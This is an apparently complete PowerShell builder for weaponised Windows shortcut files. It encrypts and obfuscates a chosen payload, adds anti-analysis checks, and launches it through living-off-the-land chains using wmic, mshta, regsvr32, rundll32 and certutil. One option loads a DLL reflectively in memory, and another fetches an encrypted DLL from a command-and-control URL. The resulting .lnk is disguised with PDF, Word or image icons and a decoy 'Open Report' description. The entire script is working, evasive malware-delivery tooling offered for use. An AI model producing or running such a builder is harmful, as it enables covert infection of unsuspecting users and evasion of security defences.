param (
    [Parameter(Mandatory=$true)]
    [string]$PayloadPath
)

# Function to generate random variable names
function Get-RandomVarName {
    return '$' + (-join ((97..122) | Get-Random -Count 5 | % {[char]$_}))
}

# Function to display a menu and get user choice (polymorphic)
function Get-MenuChoice {
    param (
        [string]$Title,
        [string[]]$Options
    )
    $menuVar = Get-RandomVarName
    $choiceVar = Get-RandomVarName
    Write-Host "`n$Title"
    for ($i = 0; $i -lt $Options.Length; $i++) {
        Write-Host "$($i + 1). $($Options[$i])"
    }
    $polyCmd = "$menuVar = { do { $choiceVar = Read-Host 'Enter your choice (1-$($Options.Length))' } while ($choiceVar -lt 1 -or $choiceVar -gt $($Options.Length)); `$Options[$choiceVar - 1] }.Invoke()"
    IEX $polyCmd
    return (IEX "$menuVar")
}

# LOLBIN options
$lolbinOptions = @(
    "wmic + mshta + regsvr32 (Extreme stealth)",
    "rundll32 + certutil + mshta (Memory injection)",
    "mshta + wmic + rundll32 (Fragmented chain)",
    "Reflective DLL (In-memory DLL injection with AES)",
    "Network Delivery (C2 fetch with AES-encrypted DLL)",
    "Create Donut DLL/PS1 (Generate for later use)"
)
$selectedLolbin = Get-MenuChoice -Title "Select LOLBIN chain, delivery method, or generation:" -Options $lolbinOptions

# Icon options (expanded)
$iconOptions = @(
    "Microsoft Edge PDF Icon",
    "Adobe Acrobat PDF Icon",
    "Generic Windows PDF Icon",
    "Microsoft Word (.doc) Icon",
    "Notepad (.txt) Icon",
    "PNG Image Icon",
    "JPEG Image Icon"
)
$selectedIcon = Get-MenuChoice -Title "Select icon source:" -Options $iconOptions

# Custom LNK name
$lnkName = Read-Host "Enter output .lnk file name (e.g., MyFile.lnk, default: Report_<random>_<date>.lnk)"
if (-not $lnkName.EndsWith(".lnk")) { $lnkName += ".lnk" }
if ([string]::IsNullOrEmpty($lnkName)) { $lnkName = "Report_$((Get-Random -Minimum 1000 -Maximum 9999))_$(Get-Date -Format 'yyyyMMdd').lnk" }

# Check for donut.exe and download if missing
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$donutPath = Join-Path $scriptDir "donut.exe"
if (-not (Test-Path $donutPath)) {
    Write-Host "donut.exe not found, downloading from GitHub..."
    $donutUrl = "https://github.com/TheWover/donut/releases/download/v1.0/donut_v1.0.zip"
    $zipPath = Join-Path $scriptDir "donut.zip"
    $polyDownload = "{ Invoke-WebRequest -Uri '$donutUrl' -OutFile '$zipPath' }.Invoke()"
    IEX $polyDownload
    $polyExtract = "{ Expand-Archive -Path '$zipPath' -DestinationPath '$scriptDir' -Force; Remove-Item '$zipPath' }.Invoke()"
    IEX $polyExtract
    if (-not (Test-Path $donutPath)) {
        Write-Error "Failed to download or extract donut.exe!"
        exit
    }
    Write-Host "donut.exe downloaded successfully."
}

# Validate payload file
if (-not (Test-Path $PayloadPath)) {
    Write-Error "Payload file not found at $PayloadPath!"
    exit
}
$payloadExt = [System.IO.Path]::GetExtension($PayloadPath).ToLower()
if ($payloadExt -ne ".exe" -and $payloadExt -ne ".ps1") {
    Write-Error "Payload must be an EXE or PS1 file!"
    exit
}

# Read PS1 content (for non-DLL/network options)
if ($payloadExt -eq ".ps1") {
    $ps1Content = Get-Content -Path $PayloadPath -Raw
} else {
    $ps1Content = ""
}

# Custom XOR encryption function (polymorphic)
function Encrypt-Payload {
    param ([string]$InputString)
    $keyVar = Get-RandomVarName
    $bytesVar = Get-RandomVarName
    $encVar = Get-RandomVarName
    $polyCmd = "$keyVar = -join ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]`$_}); $bytesVar = [Text.Encoding]::UTF8.GetBytes('$InputString'); $encVar = for (`$i = 0; `$i -lt $bytesVar.Length; `$i++) { $bytesVar[`$i] -bxor ([byte][char]$keyVar[`$i % $keyVar.Length]) }; [Convert]::ToBase64String($encVar), $keyVar"
    return (IEX $polyCmd)
}

# Polymorphic obfuscation function
function Obfuscate-Poly {
    param ([string]$InputString)
    $var1 = Get-RandomVarName
    $var2 = Get-RandomVarName
    $split = $InputString -split '' | Where-Object { $_ }
    $obf = "$var1='';"
    $obf += ($split | ForEach-Object { "$var1+='" + $_ + "';" }) -join ''
    $obf += "$var2=Get-Random;IEX $var1;"
    return $obf
}

# AES decryption function (polymorphic)
function Decrypt-AES {
    param ([string]$AesKey, [string]$Encrypted)
    $aesVar = Get-RandomVarName
    $polyCmd = "$aesVar = [Security.Cryptography.AesManaged]::Create(); $aesVar.Mode='CBC'; $aesVar.Padding='PKCS7'; $aesVar.Key=[Text.Encoding]::ASCII.GetBytes('$AesKey'); $aesVar.IV=[Byte[]]::new(16); [Convert]::FromBase64String($Encrypted) | % { $aesVar.DecryptCbc(`$_, $aesVar.IV) }"
    return $polyCmd
}

# Anti-analysis check (polymorphic)
$antiVar = Get-RandomVarName
$antiAnalysis = "$antiVar = { if([Diagnostics.Debugger]::IsAttached -or [Environment]::GetEnvironmentVariable('VMWARE') -ne `$null){exit} }.Invoke()"
$antiEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($antiAnalysis))

# Function to generate AES-encrypted DLL with Donut (polymorphic)
function Generate-DonutDll {
    param ([string]$InputFile, [string]$OutputFile, [string]$AesKey)
    $procVar = Get-RandomVarName
    $polyCmd = "$procVar = Start-Process -FilePath '$donutPath' -ArgumentList '-f `"$InputFile`" -o `"$OutputFile`" -e 3 -k `"$AesKey`"' -NoNewWindow -PassThru -Wait; if (-not (Test-Path '$OutputFile')) { Write-Error 'Donut failed to generate DLL at $OutputFile!'; exit }"
    IEX $polyCmd
    return $true
}

# Handle options
if ($selectedLolbin -eq "Reflective DLL (In-memory DLL injection with AES)") {
    $aesKey = Read-Host "Enter 16-char AES key for Donut encryption (e.g., MySecretKey12345)"
    if ($aesKey.Length -ne 16) { Write-Error "AES key must be 16 characters!"; exit }
    $dllPath = Join-Path $scriptDir "ReflectivePayload.dll"
    Generate-DonutDll -InputFile $PayloadPath -OutputFile $dllPath -AesKey $aesKey
    $dllBytes = [IO.File]::ReadAllBytes($dllPath)
    $dllEncrypted, $xorKey = Encrypt-Payload -InputString ([Convert]::ToBase64String($dllBytes))
    $decryptCmd = "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$dllEncrypted') | % { `$i=0; $_ -bxor ([byte][char]'$xorKey'[`$i++ % $xorKey.Length]) })"
    $aesDecrypt = Decrypt-AES -AesKey $aesKey -Encrypted $decryptCmd
    $injectCmd = "[Reflection.Assembly]::Load($aesDecrypt)"
    $obfInject = Obfuscate-Poly -InputString $injectCmd
    $execCmd = Obfuscate-Poly -InputString "IEX ($obfInject)"
    $finalEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($execCmd))
    $lolbinCmd = "%COMSPEC% /c wmic process call create `"rundll32 javascript:`"`"\..\mshtml,RunHTMLApplication `"`";eval(new ActiveXObject(`"WScript.Shell`").Run(`"powershell -NoP -EP Bypass -Enc $antiEncoded;$finalEncoded`",0))`" >nul & timeout /t 2 >nul"
    Remove-Item $dllPath -Force
} elseif ($selectedLolbin -eq "Network Delivery (C2 fetch with AES-encrypted DLL)") {
    $c2Url = Read-Host "Enter C2 URL for AES-encrypted DLL (e.g., http://example.com/payload.dll)"
    $aesKey = Read-Host "Enter 16-char AES key for Donut decryption (e.g., MySecretKey12345)"
    $xorKey = Read-Host "Enter 16-char XOR key for network encryption (e.g., Xk9pLm2nQv7rZt4w)"
    if ($aesKey.Length -ne 16 -or $xorKey.Length -ne 16) { Write-Error "Keys must be 16 characters!"; exit }
    $fetchCmd = "[Text.Encoding]::UTF8.GetString((Invoke-WebRequest '$c2Url' -UseBasicParsing).Content | % { `$i=0; $_ -bxor ([byte][char]'$xorKey'[`$i++ % $xorKey.Length]) })"
    $aesDecrypt = Decrypt-AES -AesKey $aesKey -Encrypted $fetchCmd
    $injectCmd = "[Reflection.Assembly]::Load($aesDecrypt)"
    $obfFetch = Obfuscate-Poly -InputString $injectCmd
    $execCmd = Obfuscate-Poly -InputString "IEX ($obfFetch)"
    $finalEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($execCmd))
    $lolbinCmd = "%COMSPEC% /c mshta vbscript:Execute(`"CreateObject(`"`"WScript.Shell`"`").Run `"`"powershell -NoP -EP Bypass -Enc $antiEncoded;$finalEncoded`"`",0:Close`") & timeout /t 2 >nul"
} elseif ($selectedLolbin -eq "Create Donut DLL/PS1 (Generate for later use)") {
    $outputType = Get-MenuChoice -Title "Generate DLL or PS1?" -Options @("DLL", "PS1")
    $outputFile = Read-Host "Enter output file name (e.g., output.dll or output.ps1)"
    $aesKey = Read-Host "Enter 16-char AES key for Donut encryption (e.g., MySecretKey12345)"
    if ($aesKey.Length -ne 16) { Write-Error "AES key must be 16 characters!"; exit }
    if ($outputType -eq "DLL") {
        Generate-DonutDll -InputFile $PayloadPath -OutputFile $outputFile -AesKey $aesKey
        Write-Host "DLL generated at: $outputFile"
    } else {
        $donutArgs = "-f `"$PayloadPath`" -o `"$outputFile`" -e 3 -k `"$aesKey`" -t"
        Start-Process -FilePath $donutPath -ArgumentList $donutArgs -NoNewWindow -Wait
        if (-not (Test-Path $outputFile)) {
            Write-Error "Donut failed to generate PS1 at $outputFile!"
            exit
        }
        Write-Host "PS1 generated at: $outputFile"
    }
    exit
} else {
    if ($payloadExt -eq ".ps1") {
        $encryptedPayload, $key = Encrypt-Payload -InputString $ps1Content
        $decryptCmd = "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$encryptedPayload') | % { `$i=0; $_ -bxor ([byte][char]'$key'[`$i++ % $key.Length]) })"
        $obfDecrypt = Obfuscate-Poly -InputString $decryptCmd
        $execCmd = Obfuscate-Poly -InputString "IEX ($obfDecrypt)"
        $finalEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($execCmd))
    } else {
        Write-Error "EXE payloads are only supported with Reflective DLL or Network Delivery options!"
        exit
    }

    switch ($selectedLolbin) {
        "wmic + mshta + regsvr32 (Extreme stealth)" {
            $vbsContent = "Set w=CreateObject(`"WScript.Shell`"):w.Run `"notepad`",0,True:Set p=CreateObject(`"WScript.Shell`"):p.Run `"powershell -NoP -EP Bypass -Enc $antiEncoded;$finalEncoded`",0,False"
            $vbsObf = Obfuscate-Poly -InputString $vbsContent
            $vbsHex = ([Text.Encoding]::ASCII.GetBytes($vbsObf) | % { [Convert]::ToString($_, 16).PadLeft(2, '0') }) -join ''
            $lolbinCmd = "%COMSPEC% /c wmic process call create `"mshta vbscript:Execute(`"CreateObject(`"`"WScript.Shell`"`").Run `"`"cmd /c echo $vbsHex> %TEMP%\t.hex & certutil -decodehex %TEMP%\t.hex %TEMP%\t.vbs >nul & regsvr32 /s /n /u /i:%TEMP%\t.vbs scrobj.dll`"`",0:Close`")`" >nul & timeout /t 2 >nul & del %TEMP%\t.hex %TEMP%\t.vbs 2>nul"
        }
        "rundll32 + certutil + mshta (Memory injection)" {
            $jsContent = "new ActiveXObject('WScript.Shell').Run('cmd /c start notepad & mshta vbscript:Execute(`"CreateObject(`"`"WScript.Shell`"`").Run `"`"powershell -NoP -EP Bypass -Enc $antiEncoded;$finalEncoded`"`",0:Close`")', 0);"
            $jsObf = Obfuscate-Poly -InputString $jsContent
            $jsHex = ([Text.Encoding]::ASCII.GetBytes($jsObf) | % { [Convert]::ToString($_, 16).PadLeft(2, '0') }) -join ''
            $lolbinCmd = "%COMSPEC% /c echo $jsHex > %TEMP%\t.hex & rundll32 javascript:`"\..\mshtml,RunHTMLApplication `";eval(new ActiveXObject('WScript.Shell').Run('cmd /c certutil -decodehex %TEMP%\t.hex %TEMP%\t.js >nul & %TEMP%\t.js',0)) & timeout /t 2 >nul & del %TEMP%\t.hex %TEMP%\t.js 2>nul"
        }
        "mshta + wmic + rundll32 (Fragmented chain)" {
            $vbsContent = "CreateObject(`"WScript.Shell`").Run `"wmic process call create `"`"notepad`"`"`,0,True:CreateObject(`"WScript.Shell`").Run `"rundll32 javascript:`"`"\..\mshtml,RunHTMLApplication `"`";eval(new ActiveXObject(`"WScript.Shell`").Run(`"powershell -NoP -EP Bypass -Enc $antiEncoded;$finalEncoded`",0))`",0,False"
            $vbsObf = Obfuscate-Poly -InputString $vbsContent
            $vbsHex = ([Text.Encoding]::ASCII.GetBytes($vbsObf) | % { [Convert]::ToString($_, 16).PadLeft(2, '0') }) -join ''
            $lolbinCmd = "%COMSPEC% /c echo $vbsHex > %TEMP%\t.hex & certutil -decodehex %TEMP%\t.hex %TEMP%\t.vbs >nul & mshta vbscript:Execute(`"CreateObject(`"`"WScript.Shell`"`").Run `"`"%TEMP%\t.vbs`"`",0:Close`") & timeout /t 2 >nul & del %TEMP%\t.hex %TEMP%\t.vbs 2>nul"
        }
    }
}

# Stealth layers (polymorphic)
$pathVar = Get-RandomVarName
$randVar = Get-RandomVarName
$obfuscatedCmd = "$pathVar = '%PATH%;%SystemRoot%'; %COMSPEC% /c set PATH=$pathVar & echo $randVar=%RANDOM% >nul & $lolbinCmd & set bar=%RANDOM% & timeout /t 1 >nul"

# Set icon
switch ($selectedIcon) {
    "Microsoft Edge PDF Icon" { $iconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13" }
    "Adobe Acrobat PDF Icon" { $iconLocation = "C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,0" }
    "Generic Windows PDF Icon" { $iconLocation = "%SystemRoot%\System32\shell32.dll,70" }
    "Microsoft Word (.doc) Icon" { $iconLocation = "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,0" }
    "Notepad (.txt) Icon" { $iconLocation = "%SystemRoot%\System32\notepad.exe,0" }
    "PNG Image Icon" { $iconLocation = "%SystemRoot%\System32\shell32.dll,13" }
    "JPEG Image Icon" { $iconLocation = "%SystemRoot%\System32\shell32.dll,14" }
}

# Create the LNK (polymorphic)
$wshVar = Get-RandomVarName
$shortcutVar = Get-RandomVarName
$lnkPath = "$([Environment]::GetFolderPath('Desktop'))\$lnkName"
$polyLnk = "$wshVar = New-Object -ComObject WScript.Shell; $shortcutVar = $wshVar.CreateShortcut('$lnkPath'); $shortcutVar.TargetPath = '%COMSPEC%'; $shortcutVar.Arguments = '$obfuscatedCmd'; $shortcutVar.IconLocation = '$iconLocation'; $shortcutVar.Description = 'Open Report - $((Get-Random -Minimum 100 -Maximum 999))'; $shortcutVar.Save()"
if ($selectedLolbin -ne "Create Donut DLL/PS1 (Generate for later use)") {
    IEX $polyLnk
    Write-Host "LNK created at: $lnkPath"
    Write-Host "Delivery method: $selectedLolbin"
    Write-Host "Icon: $selectedIcon"
}
